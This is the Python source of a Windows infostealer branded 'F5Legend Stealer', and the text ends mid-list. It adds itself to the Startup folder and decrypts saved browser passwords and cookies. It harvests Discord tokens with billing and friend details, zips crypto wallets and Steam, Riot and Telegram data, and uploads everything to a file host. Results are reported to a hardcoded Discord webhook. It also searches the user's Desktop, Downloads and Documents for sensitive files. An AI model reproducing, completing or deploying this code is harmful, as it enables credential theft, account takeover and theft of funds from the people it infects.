import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil


hook = "https://discord.com/api/webhooks/1083883439423504506/xAXfM34RexElH-qYV_kMssT3k1traHnHfCH_DKAtZ_u9fOzIXKDS98HMquC238u4E3a4"


DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng


def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global hook
    global tgmkx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "F5Legend Stealer",
                "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU",
        "username": "F5Legend Stealer",
        "attachments": []
        }
    L04durl1b(hook, data=dumps(data).encode(), headers=headers)


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "F5Legend | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [F5LegendCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "F5Legend Stealer",
                        "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
                    }
                }
            ],
            "username": "F5Legend Stealer",
            "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU",
            "attachments": []
            }
        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "F5Legend | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [F5LegendPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "F5Legend Stealer",
                        "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
                    }
                }
            ],
            "username": "F5Legend",
            "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU",
            "attachments": []
            }
        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "F5Legend | File Stealer"
                },
                "footer": {
                    "text": "F5Legend Stealer",
                    "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
                }
                }
            ],
            "username": "F5Legend Stealer",
            "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU",
            "attachments": []
            }
        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--F5Legend STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "F5Legend Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "F5Legend Stealer",
                "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU"
            }
            }
        ],
        "username": "F5Legend Stealer",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRg4m8RCvJL0b6Sr3qHhXHMAvi6bLnPJ444cA&usqp=CAU",
        "attachments": []
    }
    L04durl1b(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
